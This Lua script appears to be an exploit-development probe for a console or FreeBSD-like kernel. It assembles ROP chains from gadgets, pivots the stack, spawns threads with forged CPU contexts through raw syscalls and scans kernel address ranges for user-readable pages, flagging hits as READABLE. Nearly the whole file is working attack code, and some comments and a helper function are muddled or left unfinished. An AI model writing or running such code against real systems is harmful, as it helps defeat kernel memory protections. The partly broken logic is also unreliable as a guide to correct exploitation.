-- CRASH_CLASS: HIGH
-- PROBE 1035a: is any kernel-range page mapped user-accessible? A data read (not fetch)
-- succeeds only when the PTE has U=1; a supervisor page faults and leaves the sentinel.
print("=== PROBE 1035a ===")
local function to_num(v)
  if type(v)=="table" and v.tonumber then return v:tonumber() end
  if type(v)=="table" and v.h then return v.h*4294967296+v.l end
  return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return v end return nil end
local function rd(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end) if o then return to_num(v) end return nil end
local function A(x) local ok,v=pcall(function() return as_addr(x) end) if ok and v and v>0 then return v end return 0 end
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local hc = ropchain({ stack_base = to_num(ph.pivot_addr) })
hc:push_store_rdx_into_memory(ctxt)
hc:push_syscall_raw(syscall.write, function()
    hc:push_set_rdx(0x40); hc:push_set_rax_from_memory(ctxt); hc:push_add_to_rax(0x100)
    hc:push_set_reg_from_rax("rsi"); hc:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
hc:push_syscall_raw(mk(431), function() hc:push_set_rdi(0) end)
local pop_rax=A(gadgets["pop rax; ret"]); local ld_rax=A(gadgets["mov rax, [rax]; ret"])
local pop_rdi=A(gadgets["pop rdi; ret"]); local st_rdi=A(gadgets["mov [rdi], rax; ret"])
print(string.format("[1] pop_rax=0x%X ld=0x%X pop_rdi=0x%X st=0x%X", pop_rax,ld_rax,pop_rdi,st_rdi))
local page=0x4000
local function mmap(px)
  local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
  local v=to_num(a); if v~=0 and v<0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end; return v
end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100}
local out=mmap(page); local ctx=memory.alloc(0x500); local tb=memory.alloc(8); local ts=memory.alloc(16)
local ctxa=as_addr(ctx)
local exit_fn=0
local function read_one(target, wait_us)
  local stack=mmap(page)
  if exit_fn==0 then
    local ch={0,ld_rax,pop_rdi,out,st_rdi,pop_rax,431,0}
    for k=1,6 do wq(stack+(k-1)*8,ch[k]) end
    wq(stack+7*8,0)
    wq(out,0xDEADBEEF); for o=0,0x4F8,8 do wq(ctxa+o,0) end
    wq(ctxa+Ctx.MAGIC,0x480); wq(ctxa+Ctx.TYPE,0x10000); wq(ctxa+Ctx.CS,0x43); wq(ctxa+Ctx.SS,0x3B)
    wq(ctxa+Ctx.RIP,pop_rax); wq(ctxa+Ctx.RSP,stack)
    wq(as_addr(tb),0)
    pcall(function() return mk(430)(uint64(ctxa),uint64(as_addr(tb)),uint64(0)) end)
    wq(as_addr(ts),0); wq(as_addr(ts)+8,30000)
    pcall(function() return mk(468)(uint64(as_addr(ts)),uint64(0)) end)
    local v=rq(out)
    return to_num(mk(431)(uint64(0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) and 0) , v
  end
end
-- resolve thr_exit address once (sys 431 dispatcher entry is not a function pointer; use the loader's own)
-- Instead: end the chain with pop_rax;431;ret is not possible without a fn pointer, so children fault or spin.
-- Use a dedicated exit function from the parent process image: thr_create itself.
print("[2] scanning")
local BASE=0xFFFFFFFFD8000000
local targets={}
for i=0,48 do targets[#targets+1]=BASE+i*0x200000 end
targets[#targets+1]=0xFFFF800000000000
targets[#targets+1]=0xFFFFF00000000000
targets[#targets+1]=0x0000700000000000
local readable=0
for i,t in ipairs(targets) do
  local stack=mmap(page)
  local ch={t,ld_rax,pop_rdi,out,st_rdi,ld_rax}
  for k=1,#ch do wq(stack+(k-1)*8,ch[k]) end
  wq(out,0xDEADBEEF); for o=0,0x4F8,8 do wq(ctxa+o,0) end
  wq(ctxa+Ctx.MAGIC,0x480); wq(ctxa+Ctx.TYPE,0x10000); wq(ctxa+Ctx.CS,0x43); wq(ctxa+Ctx.SS,0x3B)
  wq(ctxa+Ctx.RIP,pop_rax); wq(ctxa+Ctx.RSP,stack)
  local rv=nil
  local ok,r=pcall(function() return mk(430)(uint64(ctxa),uint64(as_addr(tb)),uint64(0)) end)
  if ok then rv=to_num(r) end
  wq(as_addr(ts),0); wq(as_addr(ts)+8,40000)
  pcall(function() return mk(468)(uint64(as_addr(ts)),uint64(0)) end)
  local v=rq(out)
  local vs = v and string.format("%X", (function() local h,l=0,0; if type(v)=="table" and v.h then h=v.h; l=v.l else l=to_num(v) end; return l end)()) or "?"
  local sent = (v ~= nil) and (string.format("%X",to_num(v))=="DEADBEEF")
  if not sent then readable=readable+1 end
  print(string.format("[R%02d] %X rv=%s out=%s%s", i, t, tostring(rv), vs, sent and "" or "  <== READABLE"))
end
print(string.format("[Z] readable=%d alive", readable))
